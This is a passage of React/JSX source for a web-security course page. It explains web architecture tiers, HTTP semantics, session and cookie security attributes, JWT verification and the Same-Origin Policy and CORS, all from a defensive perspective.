                      ? "bg-cyan-500/15 text-orange-700 font-semibold border-l-2 border-cyan-400"
                      : "text-stone-600 hover:bg-slate-800 hover:text-stone-800"
                  }`}
                >
                  <span className="truncate">{topic.title}</span>
                  {selectedTopic === topic.id && (
                    <ChevronRight className="w-3.5 h-3.5 text-orange-600 shrink-0 ml-1" />
                  )}
                </button>
              ))}
            </div>

            {/* Quick Progress Indicator */}
            <div className="pt-3 border-t border-stone-200">
              <div className="flex items-center justify-between text-xs text-stone-600 mb-1">
                <span>DevTools Inspection Progress</span>
                <span className="text-orange-600 font-bold">{completedChecks} / 8</span>
              </div>
              <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden">
                <div
                  className="h-full bg-cyan-400 transition-all duration-300"
                  style={{ width: `${(completedChecks / 8) * 100}%` }}
                />
              </div>
            </div>
          </div>
        </div>

        {/* Right 3 Columns: Active Tab Content */}
        <div className="lg:col-span-3 space-y-8">
          {/* TAB: THEORY & ARCHITECTURE */}
          {activeTab === "theory" && (
            <div className="space-y-10">
              {/* 13.1 Module Overview */}
              <section id="section-1" className="space-y-4">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <ShieldCheck className="w-4 h-4" />
                  <span>13.1 MODULE OVERVIEW</span>
                </div>
                <h2 className="text-2xl font-bold text-white">
                  Foundations of Web Application Architecture & Browser Defenses
                </h2>
                <p className="text-stone-700 text-sm sm:text-base leading-relaxed">
                  Modern web applications combine browsers, frontend code, backend services, APIs,
                  databases, identity providers, and third-party integrations. A vulnerability in any
                  layer—or in the way two layers communicate—can expose user data, allow unauthorized
                  actions, or compromise an application.
                </p>
                <p className="text-stone-700 text-sm sm:text-base leading-relaxed">
                  This module develops the architectural knowledge needed to understand how web
                  applications work, how browsers maintain state across HTTP requests, how sessions
                  and cookies are secured, and how browser security controls reduce attacks such as
                  cross-site scripting (XSS), cross-site request forgery (CSRF), clickjacking, and
                  cross-origin data exposure.
                </p>

                <div className="bg-cyan-950/20 border border-cyan-800/40 rounded-xl p-5 space-y-3">
                  <h4 className="text-sm font-bold text-orange-700 flex items-center space-x-2">
                    <Target className="w-4 h-4 text-orange-600" />
                    <span>Learning Objectives</span>
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs text-stone-700">
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Explain common web architectures and the role of each tier.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Trace an HTTP request from browser DOM to backend and back.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Interpret HTTP methods, status codes, headers, and payloads.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Distinguish authentication, authorization, sessions, and JWTs.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Master Same-Origin Policy (SOP) boundaries and CORS preflights.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Configure secure cookies (Secure, HttpOnly, SameSite, __Host-).</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Deploy CSP, HSTS, frame-ancestors, and nosniff defense headers.</span>
                    </div>
                    <div className="flex items-start space-x-2">
                      <CheckCircle2 className="w-4 h-4 text-orange-600 shrink-0 mt-0.5" />
                      <span>Audit applications locally using Browser DevTools Network/Storage.</span>
                    </div>
                  </div>
                </div>
              </section>

              {/* 13.2 Web Application Architecture */}
              <section id="section-2" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Layers className="w-4 h-4" />
                  <span>13.2 WEB APPLICATION ARCHITECTURE</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Multi-Tier Component Model & Defense in Depth
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  A web application is a system of cooperative components delivering capabilities
                  through a browser or HTTP client. Securing it requires understanding each tier&apos;s
                  responsibilities and trust boundaries.
                </p>

                {/* 5 Architecture Tiers Visualizer */}
                <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 text-center space-y-1">
                    <div className="text-xs font-mono text-orange-600 font-bold">1. Client / Browser</div>
                    <div className="text-xs text-stone-700 font-semibold">Untrusted Host</div>
                    <p className="text-[11px] text-stone-600">
                      HTML, CSS, DOM, JS execution, fetch API, cookie storage, user interaction.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 text-center space-y-1">
                    <div className="text-xs font-mono text-amber-400 font-bold">2. Reverse Proxy / Edge</div>
                    <div className="text-xs text-stone-700 font-semibold">Traffic Gatekeeper</div>
                    <p className="text-[11px] text-stone-600">
                      TLS termination, asset caching, routing, WAF inspection, rate limiting.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 text-center space-y-1">
                    <div className="text-xs font-mono text-emerald-400 font-bold">3. Backend / API</div>
                    <div className="text-xs text-stone-700 font-semibold">Trusted Core</div>
                    <p className="text-[11px] text-stone-600">
                      Input validation, AuthN/AuthZ, session state, business rules, auditing.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 text-center space-y-1">
                    <div className="text-xs font-mono text-indigo-400 font-bold">4. Data Layer</div>
                    <div className="text-xs text-stone-700 font-semibold">Persistence</div>
                    <p className="text-[11px] text-stone-600">
                      PostgreSQL, Redis caches, S3 object storage, parameterized queries.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 text-center space-y-1">
                    <div className="text-xs font-mono text-rose-400 font-bold">5. External Services</div>
                    <div className="text-xs text-stone-700 font-semibold">3rd Party APIs</div>
                    <p className="text-[11px] text-stone-600">
                      OAuth2 IdPs, Stripe payment gateway, SendGrid email services.
                    </p>
                  </div>
                </div>

                <div className="bg-amber-950/20 border border-amber-800/40 rounded-xl p-4 text-xs text-amber-200/90 leading-relaxed">
                  <strong className="text-amber-300">The Golden Security Axiom:</strong> The client
                  browser environment is entirely controlled by the user. Client-side input checks,
                  hidden buttons, and disabled UI elements improve usability but offer zero security
                  guarantees. The backend must enforce authentication, authorization, and input validation
                  on every single HTTP request.
                </div>

                {/* 13.2.5 Architectural Patterns Table */}
                <div className="space-y-3">
                  <h3 className="text-base font-semibold text-white">
                    13.2.5 Common Architectural Patterns & Security Considerations
                  </h3>
                  <div className="overflow-x-auto border border-stone-200 rounded-xl">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-stone-50/90 text-stone-700 uppercase font-mono border-b border-stone-200">
                        <tr>
                          <th className="p-3">Architecture</th>
                          <th className="p-3">Description</th>
                          <th className="p-3">Primary Security Considerations</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60 text-stone-700">
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-semibold text-orange-700">Monolithic</td>
                          <td className="p-3">All application services run as one deployable backend codebase.</td>
                          <td className="p-3">A compromise can expose all subsystems; strict internal authorization boundaries remain vital.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-semibold text-orange-700">Three-Tier</td>
                          <td className="p-3">Presentation, application logic, and data storage are physically decoupled.</td>
                          <td className="p-3">Enforce firewall and network segmentation between web tier, app tier, and database tier.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-semibold text-orange-700">SPA + REST/GraphQL API</td>
                          <td className="p-3">Heavy JavaScript client (React/Vue) communicates with stateless or stateful APIs.</td>
                          <td className="p-3">CORS restrictions, token/session cookie storage, XSS resistance, and API endpoint authorization.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-semibold text-orange-700">Server-Rendered (SSR)</td>
                          <td className="p-3">HTML generated dynamically on the server before reaching the client.</td>
                          <td className="p-3">Contextual template HTML escaping, robust session management, and anti-CSRF token synchronization.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-semibold text-orange-700">Microservices</td>
                          <td className="p-3">Distributed specialized services communicating via gRPC/REST over private mesh.</td>
                          <td className="p-3">Mutual TLS (mTLS) service identity, internal authz tokens, secret rotation, service mesh boundaries.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-semibold text-orange-700">Serverless Functions</td>
                          <td className="p-3">Event-driven managed cloud functions responding to HTTP triggers.</td>
                          <td className="p-3">Least-privilege IAM roles per function, event payload validation, cold start secrets management.</td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>
              </section>

              {/* 13.3 HTTP Fundamentals */}
              <section id="section-3" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Terminal className="w-4 h-4" />
                  <span>13.3 HTTP FUNDAMENTALS & WIRE PROCESSING</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  HTTP Semantics, Methods, Status Codes & Security Headers
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  HTTP is fundamentally a stateless request-response protocol governed by RFC 9110.
                  HTTPS secures HTTP with Transport Layer Security (TLS), guaranteeing integrity and
                  confidentiality on the wire while authenticating the server.
                </p>

                {/* HTTP Methods Table */}
                <div className="space-y-3">
                  <h3 className="text-base font-semibold text-white">13.3.3 HTTP Methods & Security Invariants</h3>
                  <div className="overflow-x-auto border border-stone-200 rounded-xl">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-stone-50/90 text-stone-700 uppercase font-mono border-b border-stone-200">
                        <tr>
                          <th className="p-3">Method</th>
                          <th className="p-3">Semantics</th>
                          <th className="p-3">Idempotent?</th>
                          <th className="p-3">Security Considerations</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60 text-stone-700">
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-emerald-400">GET</td>
                          <td className="p-3">Retrieve representation of specified resource.</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes (Safe)</td>
                          <td className="p-3">Must NOT trigger state-changing operations. URLs leak in access logs, bookmarks, and Referer headers.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-amber-400">POST</td>
                          <td className="p-3">Submit processing payload or create child resource.</td>
                          <td className="p-3 text-rose-400 font-mono">No</td>
                          <td className="p-3">Validate input length/schema; enforce anti-CSRF protection on browser form submissions.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-orange-600">PUT</td>
                          <td className="p-3">Create or completely replace target resource.</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes</td>
                          <td className="p-3">Enforce strict ownership checks. Prevent overriding resources belonging to other tenants.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-orange-600">PATCH</td>
                          <td className="p-3">Apply partial delta modifications to a resource.</td>
                          <td className="p-3 text-rose-400 font-mono">No</td>
                          <td className="p-3">Vulnerable to mass assignment! Whitelist permitted fields so users cannot update role or isAdmin.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-rose-400">DELETE</td>
                          <td className="p-3">Remove specified resource permanently or soft-delete.</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes</td>
                          <td className="p-3">Enforce tenant isolation. Prevent blind deletion of unowned database records.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-stone-600">OPTIONS</td>
                          <td className="p-3">Query supported communication options and CORS policies.</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes (Safe)</td>
                          <td className="p-3">Used for CORS preflight checks. Ensure server does not leak administrative endpoints in Allow headers.</td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>

                {/* HTTP Status Codes Table */}
                <div className="space-y-3">
                  <h3 className="text-base font-semibold text-white">13.3.4 Security Implications of Status Codes</h3>
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-xs">
                    <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1">
                      <div className="font-mono font-bold text-emerald-400">200 / 201 / 204</div>
                      <div className="font-semibold text-white">Success Classes</div>
                      <p className="text-stone-600 text-[11px]">
                        200 OK (returned), 201 Created (resource allocated), 204 No Content (action succeeded with empty body).
                      </p>
                    </div>
                    <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1">
                      <div className="font-mono font-bold text-indigo-400">301 / 302 / 304</div>
                      <div className="font-semibold text-white">Redirection & Cache</div>
                      <p className="text-stone-600 text-[11px]">
                        301 Permanent, 302 Found (check for open redirects!), 304 Not Modified (conditional ETag/If-Modified-Since).
                      </p>
                    </div>
                    <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1">
                      <div className="font-mono font-bold text-amber-400">401 vs 403 vs 404</div>
                      <div className="font-semibold text-white">Client Error & Auth</div>
                      <p className="text-stone-600 text-[11px]">
                        401 Unauthorized (missing AuthN), 403 Forbidden (authenticated but lacks role), 404 Not Found (or disguised 403 to prevent enum).
                      </p>
                    </div>
                    <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 space-y-1">
                      <div className="font-mono font-bold text-rose-400">429 / 500 / 502 / 504</div>
                      <div className="font-semibold text-white">Rate Limits & Server</div>
                      <p className="text-stone-600 text-[11px]">
                        429 Too Many Requests (rate limiting), 500 Internal Error (never leak stack traces!), 502/504 Gateway errors.
                      </p>
                    </div>
                  </div>
                </div>
              </section>

              {/* 13.4 Stateless HTTP vs Stateful Application Sessions */}
              <section id="section-4" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <KeyRound className="w-4 h-4" />
                  <span>13.4 STATELESS HTTP VS STATEFUL SESSIONS</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Session Lifecycle, Identifier Entropy & Timeout Policies
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Because HTTP does not natively persist user identity across connections, web
                  applications instantiate stateful continuity using cryptographic session tokens or
                  state records stored in server-side datastores (Redis, database).
                </p>

                {/* Session Lifecycle Flowchart */}
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-4">
                  <h4 className="text-sm font-bold text-stone-800">Session Security Lifecycle</h4>
                  <div className="grid grid-cols-1 sm:grid-cols-5 gap-3 text-xs text-center">
                    <div className="p-3 rounded-lg bg-slate-800/80 border border-stone-300">
                      <div className="font-bold text-stone-600">1. Unauthenticated</div>
                      <p className="text-[11px] text-stone-600 mt-1">
                        Anonymous visitor; no session or unprivileged guest token.
                      </p>
                    </div>
                    <div className="p-3 rounded-lg bg-cyan-950/60 border border-cyan-800/60">
                      <div className="font-bold text-orange-700">2. Authentication</div>
                      <p className="text-[11px] text-stone-700 mt-1">
                        Credentials verified. Server rotates session ID to defeat session fixation.
                      </p>
                    </div>
                    <div className="p-3 rounded-lg bg-emerald-950/60 border border-emerald-800/60">
                      <div className="font-bold text-emerald-300">3. Active Session</div>
                      <p className="text-[11px] text-stone-700 mt-1">
                        CSPRNG session ID sent in Secure HttpOnly cookie. Server validates per request.
                      </p>
                    </div>
                    <div className="p-3 rounded-lg bg-amber-950/60 border border-amber-800/60">
                      <div className="font-bold text-amber-300">4. Rotation</div>
                      <p className="text-[11px] text-stone-700 mt-1">
                        Periodic rotation & re-authentication before sensitive operations (password change).
                      </p>
                    </div>
                    <div className="p-3 rounded-lg bg-rose-950/60 border border-rose-800/60">
                      <div className="font-bold text-rose-300">5. Invalidation</div>
                      <p className="text-[11px] text-stone-700 mt-1">
                        Explicit logout, idle timeout, or absolute expiry destroys backend session record.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Timeout Policies */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <h5 className="font-bold text-orange-700 flex items-center space-x-1.5">
                      <Clock className="w-4 h-4 text-orange-600" />
                      <span>Idle Timeout Policy (Inactivity)</span>
                    </h5>
                    <p className="text-stone-700 leading-relaxed">
                      Terminates the session after a specified duration of inactive user activity
                      (e.g., 15–30 minutes for banking; 2–4 hours for educational platforms). Protects
                      against physical workstation abandonment.
                    </p>
                  </div>
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-4 space-y-2">
                    <h5 className="font-bold text-orange-700 flex items-center space-x-1.5">
                      <ShieldAlert className="w-4 h-4 text-orange-600" />
                      <span>Absolute Timeout Policy (Max Lifetime)</span>
                    </h5>
                    <p className="text-stone-700 leading-relaxed">
                      Enforces a hard session termination ceiling regardless of continuous activity
                      (e.g., 8–12 hours). Forces a fresh re-authentication cycle, preventing
                      indefinite persistence if a token is covertly cloned.
                    </p>
                  </div>
                </div>
              </section>

              {/* 13.5 Cookies: Storage, Scope & Security Attributes */}
              <section id="section-5" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Cookie className="w-4 h-4" />
                  <span>13.5 COOKIES: ATTRIBUTES, SCOPE & PREFIXES</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Cookie Security Invariants, Prefix Rules & Storage Matrix
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Cookies are stateful data packets governed by RFC 6265bis. The server sets cookies via{" "}
                  <code className="text-orange-600 font-mono">Set-Cookie</code> response headers, and the
                  browser attaches applicable cookies via the{" "}
                  <code className="text-orange-600 font-mono">Cookie</code> request header.
                </p>

                {/* Cookie Attributes Table */}
                <div className="space-y-3">
                  <h3 className="text-base font-semibold text-white">13.5.2 Essential Cookie Security Flags</h3>
                  <div className="overflow-x-auto border border-stone-200 rounded-xl">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-stone-50/90 text-stone-700 uppercase font-mono border-b border-stone-200">
                        <tr>
                          <th className="p-3">Attribute</th>
                          <th className="p-3">Browser Behavior</th>
                          <th className="p-3">Security Function</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60 text-stone-700">
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-orange-600">Secure</td>
                          <td className="p-3">Browser sends cookie ONLY over encrypted HTTPS connections.</td>
                          <td className="p-3">Prevents plaintext eavesdropping and wire interception on untrusted Wi-Fi.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-orange-600">HttpOnly</td>
                          <td className="p-3">Blocks client-side JavaScript APIs (<code className="font-mono text-stone-800">document.cookie</code>).</td>
                          <td className="p-3">Mitigates direct session token exfiltration through XSS script injection.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-orange-600">SameSite=Strict</td>
                          <td className="p-3">Never sent in cross-site requests (even incoming top-level link clicks).</td>
                          <td className="p-3">Maximum CSRF protection. User arrives unauthenticated until clicking internal link.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-orange-600">SameSite=Lax</td>
                          <td className="p-3">Sent on top-level safe GET navigations (links); blocked on cross-site POSTs & iframes.</td>
                          <td className="p-3">Balanced industry standard for web application session cookies.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-rose-400">SameSite=None</td>
                          <td className="p-3">Sent on all third-party subresource requests. Must pair with Secure.</td>
                          <td className="p-3">Used for third-party widgets/SSO. Leaves endpoints completely vulnerable to CSRF if unprotected!</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-amber-400">Domain</td>
                          <td className="p-3">Scopes cookie to parent domain and all current/future subdomains.</td>
                          <td className="p-3">Omit unless necessary! Broad domains let compromised subdomains capture tokens.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-mono font-bold text-emerald-400">__Host- Prefix</td>
                          <td className="p-3">Enforces Secure, Path=/, and NO Domain attribute (strictly host-only).</td>
                          <td className="p-3">Prevents subdomain cookie tossing, spoofing, and parent domain injection.</td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>

                {/* Storage Comparison Table */}
                <div className="space-y-3">
                  <h3 className="text-base font-semibold text-white">13.5.5 Browser Storage Mechanisms Compared</h3>
                  <div className="overflow-x-auto border border-stone-200 rounded-xl">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-stone-50/90 text-stone-700 uppercase font-mono border-b border-stone-200">
                        <tr>
                          <th className="p-3">Storage Type</th>
                          <th className="p-3">Persistence</th>
                          <th className="p-3">Auto Sent in HTTP?</th>
                          <th className="p-3">JS Accessible?</th>
                          <th className="p-3">Primary Threat Vector</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60 text-stone-700">
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-bold text-orange-700">HttpOnly Cookies</td>
                          <td className="p-3">Session or configured Max-Age</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes (matches scope)</td>
                          <td className="p-3 text-rose-400 font-mono">No (Blocked)</td>
                          <td className="p-3">CSRF if SameSite missing; CSRF token required.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-bold text-amber-300">localStorage</td>
                          <td className="p-3">Persistent until explicitly cleared</td>
                          <td className="p-3 text-rose-400 font-mono">No</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes (Full Read/Write)</td>
                          <td className="p-3">Catastrophic XSS! Any injected script can read all stored tokens.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-bold text-indigo-300">sessionStorage</td>
                          <td className="p-3">Scoped to browser tab lifetime</td>
                          <td className="p-3 text-rose-400 font-mono">No</td>
                          <td className="p-3 text-emerald-400 font-mono">Yes (Full Read/Write)</td>
                          <td className="p-3">Vulnerable to tab XSS script injection.</td>
                        </tr>
                        <tr className="hover:bg-stone-50/40">
                          <td className="p-3 font-bold text-emerald-300">In-Memory (JS closure)</td>
                          <td className="p-3">Lost on page reload or navigation</td>
                          <td className="p-3 text-rose-400 font-mono">No (via fetch header)</td>
                          <td className="p-3 text-stone-700 font-mono">Transient</td>
                          <td className="p-3">Short-lived access tokens; still vulnerable to active XSS memory scraping.</td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>
              </section>

              {/* 13.6 Auth Cookies, Bearer Tokens & JWTs */}
              <section id="section-6" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Key className="w-4 h-4" />
                  <span>13.6 AUTHENTICATION COOKIES, BEARER TOKENS & JWTS</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  Opaque Session Identifiers vs Self-Contained Signed JWTs
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  Choosing between server-side sessions and stateless bearer tokens dictates your
                  revocation model, payload visibility, and scaling profile.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                    <div className="flex items-center space-x-2 text-orange-600 font-bold">
                      <Lock className="w-4 h-4" />
                      <span>Opaque Server-Side Session Identifiers</span>
                    </div>
                    <ul className="space-y-1.5 text-stone-700 list-disc list-inside">
                      <li>Random 128-bit or 256-bit CSPRNG string stored in Redis or SQL.</li>
                      <li>Token itself carries no user claims, roles, or personal data.</li>
                      <li>
                        <strong className="text-emerald-400">Instant Revocation:</strong> Deleting the
                        record immediately logs the user out everywhere.
                      </li>
                      <li>Protected by browser cookie attributes (HttpOnly, Secure, SameSite=Lax).</li>
                    </ul>
                  </div>

                  <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                    <div className="flex items-center space-x-2 text-amber-400 font-bold">
                      <FileCode className="w-4 h-4" />
                      <span>JSON Web Tokens (JWT / RFC 7519)</span>
                    </div>
                    <ul className="space-y-1.5 text-stone-700 list-disc list-inside">
                      <li>Self-contained Base64URL-encoded JSON with cryptographic signature.</li>
                      <li>
                        <strong className="text-rose-400">Not Encrypted:</strong> Anyone can decode and
                        read user claims (user_id, email, roles).
                      </li>
                      <li>
                        <strong className="text-amber-400">Revocation is Difficult:</strong> Remains valid
                        until expiration (<code className="font-mono">exp</code>) unless a distributed deny list is queried.
                      </li>
                      <li>Sent via <code className="font-mono">Authorization: Bearer &lt;token&gt;</code> header.</li>
                    </ul>
                  </div>
                </div>

                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                  <h4 className="text-sm font-bold text-white flex items-center space-x-2">
                    <ShieldCheck className="w-4 h-4 text-emerald-400" />
                    <span>JWT Backend Verification Requirements (Never Trust Client Decode)</span>
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs text-stone-700">
                    <div className="space-y-1">
                      <div className="font-semibold text-orange-700">1. Algorithm Whitelisting</div>
                      <p className="text-stone-600">
                        Reject <code className="font-mono text-rose-400">alg: none</code> and prevent asymmetric vs symmetric key confusion (RS256 vs HS256).
                      </p>
                    </div>
                    <div className="space-y-1">
                      <div className="font-semibold text-orange-700">2. Signature Verification</div>
                      <p className="text-stone-600">
                        Validate the signature using the authentic server public key or HMAC secret key.
                      </p>
                    </div>
                    <div className="space-y-1">
                      <div className="font-semibold text-orange-700">3. Standard Claims Validation</div>
                      <p className="text-stone-600">
                        Verify <code className="font-mono">exp</code> (expiration), <code className="font-mono">nbf</code> (not before), <code className="font-mono">iss</code> (issuer), and <code className="font-mono">aud</code> (audience).
                      </p>
                    </div>
                    <div className="space-y-1">
                      <div className="font-semibold text-orange-700">4. Replay & Revocation Check</div>
                      <p className="text-stone-600">
                        Check <code className="font-mono">jti</code> (JWT ID) against token blacklist on critical privilege operations.
                      </p>
                    </div>
                  </div>
                </div>
              </section>

              {/* 13.7 Browser Security Model: Origins, SOP & CORS */}
              <section id="section-7" className="space-y-6 pt-6 border-t border-stone-200">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <Globe className="w-4 h-4" />
                  <span>13.7 BROWSER SECURITY MODEL: ORIGINS, SOP & CORS</span>
                </div>
                <h2 className="text-xl font-bold text-white">
                  The Same-Origin Policy (SOP) & Cross-Origin Resource Sharing (CORS)
                </h2>
                <p className="text-stone-700 text-sm leading-relaxed">
                  The Same-Origin Policy is the cornerstone of web security. It guarantees that an
                  attacker-controlled page cannot execute arbitrary JavaScript to read confidential data
                  from another application running in the user&apos;s browser.
                </p>

                {/* Origin vs Site Definition */}
                <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3">
                  <h4 className="text-sm font-bold text-white">An Origin: Scheme + Host + Port</h4>
                  <div className="overflow-x-auto">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-slate-800/80 font-mono text-stone-700">
                        <tr>
                          <th className="p-2">Compared URL to https://app.prepspaces.com:443</th>
                          <th className="p-2">Same Origin?</th>
                          <th className="p-2">Reason</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800 text-stone-700">
                        <tr>
                          <td className="p-2 font-mono">https://app.prepspaces.com/dashboard/scores</td>
                          <td className="p-2 text-emerald-400 font-bold">Yes</td>
                          <td className="p-2">Scheme, host, and port are identical (only path differs).</td>
                        </tr>
                        <tr>
                          <td className="p-2 font-mono">http://app.prepspaces.com:80</td>
                          <td className="p-2 text-rose-400 font-bold">No</td>
                          <td className="p-2">Scheme mismatch (http vs https) and port mismatch (80 vs 443).</td>
                        </tr>
                        <tr>
                          <td className="p-2 font-mono">https://api.prepspaces.com:443</td>
                          <td className="p-2 text-rose-400 font-bold">No</td>
                          <td className="p-2">Host mismatch (<code className="font-mono">api</code> subdomain vs <code className="font-mono">app</code>).</td>
                        </tr>
                        <tr>
                          <td className="p-2 font-mono">https://app.prepspaces.com:8443</td>
                          <td className="p-2 text-rose-400 font-bold">No</td>
                          <td className="p-2">Port mismatch (8443 vs 443).</td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>

                {/* CORS Deep Dive */}
                <div className="bg-cyan-950/20 border border-cyan-800/40 rounded-xl p-5 space-y-3 text-xs leading-relaxed">
                  <h4 className="text-sm font-bold text-orange-700 flex items-center space-x-2">
                    <RefreshCw className="w-4 h-4 text-orange-600" />
                    <span>CORS Rules for Production Defense</span>
                  </h4>
                  <ul className="space-y-1.5 text-stone-700 list-disc list-inside">
                    <li>
                      <strong>CORS is an opt-in browser relaxation:</strong> It allows a server to explicitly permit foreign origins to read response bodies.
                    </li>
                    <li>
                      <strong>Preflight OPTIONS Requests:</strong> Non-simple requests (methods like PUT/DELETE/PATCH, or headers like <code className="font-mono">Authorization</code>, or <code className="font-mono">Content-Type: application/json</code>) trigger an automatic preflight check.
                    </li>
                    <li>
